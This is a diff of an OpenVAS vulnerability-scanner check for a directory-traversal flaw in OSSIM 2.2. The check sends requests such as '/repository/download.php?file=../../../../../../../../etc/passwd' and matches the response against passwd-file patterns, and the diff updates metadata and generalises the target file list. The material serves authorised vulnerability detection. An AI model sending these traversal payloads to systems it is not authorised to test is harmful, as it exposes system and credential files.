@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ossim_38780.nasl 6705 2017-07-12 14:25:59Z cfischer $
+# $Id: gb_ossim_38780.nasl 11625 2018-09-26 12:08:49Z jschulte $
 #
 # OSSIM 'file' Parameter Directory Traversal Vulnerability
 #
@@ -26,50 +26,48 @@
 
 CPE = "cpe:/a:alienvault:open_source_security_information_management";
 
-tag_summary = "OSSIM is prone to a directory-traversal vulnerability because it fails
-to sufficiently sanitize user-supplied input data.
-
-Exploiting the issue may allow an attacker to obtain sensitive
-information that could aid in further attacks.
-
-OSSIM 2.2 is affected; other versions may also be vulnerable.";
-
-tag_solution = "The vendor has released an update to address this issue. Please see
-the references for more information.";
-
 if (description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.100542");
- script_version("$Revision: 6705 $");
- script_tag(name:"last_modification", value:"$Date: 2017-07-12 16:25:59 +0200 (Wed, 12 Jul 2017) $");
- script_tag(name:"creation_date", value:"2010-03-19 11:14:17 +0100 (Fri, 19 Mar 2010)");
- script_bugtraq_id(38780);
- script_tag(name:"cvss_base", value:"5.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
+  script_oid("1.3.6.1.4.1.25623.1.0.100542");
+  script_version("$Revision: 11625 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-26 14:08:49 +0200 (Wed, 26 Sep 2018) $");
+  script_tag(name:"creation_date", value:"2010-03-19 11:14:17 +0100 (Fri, 19 Mar 2010)");
+  script_bugtraq_id(38780);
+  script_tag(name:"cvss_base", value:"5.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 
- script_name("OSSIM 'file' Parameter Directory Traversal Vulnerability");
+  script_name("OSSIM 'file' Parameter Directory Traversal Vulnerability");
 
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38780");
- script_xref(name : "URL" , value : "http://www.alienvault.com/community.php?section=News");
- script_xref(name : "URL" , value : "http://www.cybsec.com/vuln/cybsec_advisory_2010_0306_ossim2_2_arbitrary_file_download.pdf");
- script_xref(name : "URL" , value : "http://ossim.net/");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38780");
+  script_xref(name:"URL", value:"http://www.alienvault.com/community.php?section=News");
+  script_xref(name:"URL", value:"http://www.cybsec.com/vuln/cybsec_advisory_2010_0306_ossim2_2_arbitrary_file_download.pdf");
+  script_xref(name:"URL", value:"http://ossim.net/");
 
- script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("gb_ossim_web_detect.nasl");
- script_require_ports("Services/www", 80);
- script_mandatory_keys("OSSIM/installed");
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
+  script_dependencies("gb_ossim_web_detect.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("OSSIM/installed");
 
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"solution", value:"The vendor has released an update to address this issue. Please see
+  the references for more information.");
+  script_tag(name:"summary", value:"OSSIM is prone to a directory-traversal vulnerability because it fails
+  to sufficiently sanitize user-supplied input data.
+
+  Exploiting the issue may allow an attacker to obtain sensitive
+  information that could aid in further attacks.
+
+  OSSIM 2.2 is affected; other versions may also be vulnerable.");
+  exit(0);
 }
 
 include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 if (!port = get_app_port(cpe: CPE))
   exit(0);
@@ -80,16 +78,22 @@ if (!dir = get_app_location(cpe: CPE, port: port))
 if (dir == "/")
   dir = "";
 
-url = string(dir,"/repository/download.php?file=../../../../../../../../etc/passwd&name=passwd.txt"); 
-req = http_get(item:url, port:port);
-buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
-if( buf == NULL )continue;
+files = traversal_files("linux");
 
-if(egrep(pattern: "root:.*:0:[01]:.*", string: buf, icase: TRUE)) {
-     
-  security_message(port:port);
-  exit(0);
+foreach pattern(keys(files)) {
+  file = files[pattern];
 
+  url = string(dir,"/repository/download.php?file=../../../../../../../../" + file + "&name=passwd.txt");
+
+  req = http_get(item:url, port:port);
+  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
+  if(buf == NULL)continue;
+
+  if(egrep(pattern:pattern, string:buf, icase:TRUE)) {
+    report = report_vuln_url(url:url);
+    security_message(data:report, port:port);
+    exit(0);
+  }
 }
 
 exit(0);
